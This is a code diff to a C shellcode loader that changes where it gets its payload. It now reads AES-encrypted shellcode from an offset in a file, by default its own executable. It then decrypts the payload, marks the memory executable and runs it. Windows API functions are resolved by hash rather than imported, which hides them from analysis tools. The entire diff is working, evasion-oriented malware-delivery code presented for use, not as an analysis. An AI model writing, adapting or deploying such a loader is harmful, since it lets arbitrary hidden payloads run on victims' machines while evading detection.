@@ -4,8 +4,10 @@
 struct {
     unsigned char aes_key[16];
     unsigned char aes_iv[16];
-    unsigned char data[4*1024*1024];
+    unsigned char *data;
     int len;
+    int offset;
+    char file[_MAX_PATH];
 } sc = { "Hello, World!" };
 
 #define Kernel32Lib_Hash 0x1cca9ce6
@@ -24,6 +26,22 @@ typedef BOOL(WINAPI* _VirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flN
 
 #define Sleep_Hash 1065713747
 typedef VOID(WINAPI* _Sleep)(DWORD dwMilliseconds);
+
+#define GetModuleFileName_Hash 1888753264
+typedef DWORD(WINAPI* _GetModuleFileName)(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
+
+#define SetFilePointer_Hash 1978850691
+typedef DWORD(WINAPI* _SetFilePointer)(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
+
+#define CreateFileA_Hash 1470354217
+typedef HANDLE(WINAPI* _CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, 
+    DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
+
+#define ReadFile_Hash 990362902
+typedef BOOL(WINAPI* _ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
+
+#define CloseHandle_Hash 110641196
+typedef BOOL(WINAPI* _CloseHandle)(HANDLE hObject);
 
 typedef struct _UNICODE_STR {
     USHORT Length;
@@ -201,56 +219,42 @@ void* get_proc_address_from_hash(HMODULE module, uint32_t func_hash, _GetProcAdd
     return 0;
 }
 
-inline void* mc(void* dest, const void* src, size_t n)
-{
-    char* d = (char*)dest;
-    const char* s = (const char*)src;
-    while (n--)
-        *d++ = *s++;
-    return dest;
-}
-
 // A simple shell code loader.
 // Copy left (c) yuanyuanxiang.
 #ifdef _DEBUG
-// Tip: Use menu to generate TinyRun.c.
-#ifdef _WIN64
-#include "../x64/Release/TinyRun.c"
-#else
-#include "../Release/TinyRun.c"
+#define entry main
 #endif
-int main()
-{
-    sc.len = Shellcode_len;
-    if (sc.len > sizeof(sc.data)) return -1;
-    memcpy(sc.data, Shellcode, sc.len);
-    memcpy(sc.aes_iv, "It is a example", 16);
-    memcpy(sc.aes_key, "It is a example", 16);
-#else
 int entry()
 {
-#endif
-    if (!sc.data[0] || !sc.len)
-        return -1;
-
-    struct AES_ctx ctx;
-    AES_init_ctx_iv(&ctx, sc.aes_key, sc.aes_iv);
-    AES_CBC_decrypt_buffer(&ctx, sc.data, sc.len);
-
     HMODULE kernel32 = get_kernel32_base();
-    if (!kernel32) return -2;
+    if (!kernel32) return 1;
     _GetProcAddress GetProcAddress = (_GetProcAddress)get_proc_address_from_hash(kernel32, GetProcAddress_Hash, 0);
     _LoadLibraryA LoadLibraryA = (_LoadLibraryA)get_proc_address_from_hash(kernel32, LoadLibraryA_Hash, GetProcAddress);
     _VirtualAlloc VirtualAlloc = (_VirtualAlloc)get_proc_address_from_hash(kernel32, VirtualAlloc_Hash, GetProcAddress);
     _VirtualProtect VirtualProtect = (_VirtualProtect)get_proc_address_from_hash(kernel32, VirtualProtect_Hash, GetProcAddress);
     _Sleep Sleep = (_Sleep)get_proc_address_from_hash(kernel32, Sleep_Hash, GetProcAddress);
-    void* exec = VirtualAlloc(NULL, sc.len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (exec) {
-        mc(exec, sc.data, sc.len);
-        DWORD oldProtect = 0;
-        if (!VirtualProtect(exec, sc.len, PAGE_EXECUTE_READ, &oldProtect)) return -3;
-        ((void(*)())exec)();
-        Sleep(INFINITE);
-    }
+    _GetModuleFileName  GetModulePath = (_GetModuleFileName)get_proc_address_from_hash(kernel32, GetModuleFileName_Hash, GetProcAddress);
+    _CreateFileA CreateFileA = (_CreateFileA)get_proc_address_from_hash(kernel32, CreateFileA_Hash, GetProcAddress);
+    _SetFilePointer SetFilePointer = (_SetFilePointer)get_proc_address_from_hash(kernel32, SetFilePointer_Hash, GetProcAddress);
+    _ReadFile ReadFile = (_ReadFile)get_proc_address_from_hash(kernel32, ReadFile_Hash, GetProcAddress);
+    _CloseHandle CloseHandle = (_CloseHandle)get_proc_address_from_hash(kernel32, CloseHandle_Hash, GetProcAddress);
+
+    if (!sc.file[0]) GetModulePath(NULL, sc.file, MAX_PATH);
+    HANDLE hFile = CreateFileA(sc.file, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) return 2;
+    SetFilePointer(hFile, (LONG)sc.offset, NULL, FILE_BEGIN);
+    DWORD bytesRead = 0;
+    sc.data = VirtualAlloc(NULL, sc.len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!ReadFile(hFile, sc.data, sc.len, &bytesRead, NULL)) return 3;
+    CloseHandle(hFile);
+    if (!sc.data || !sc.len) return 4;
+    struct AES_ctx ctx;
+    AES_init_ctx_iv(&ctx, sc.aes_key, sc.aes_iv);
+    AES_CBC_decrypt_buffer(&ctx, sc.data, sc.len);
+	DWORD oldProtect = 0;
+	if (!VirtualProtect(sc.data, sc.len, PAGE_EXECUTE_READ, &oldProtect)) return 5;
+	((void(*)())sc.data)();
+	Sleep(INFINITE);
+
     return 0;
 }
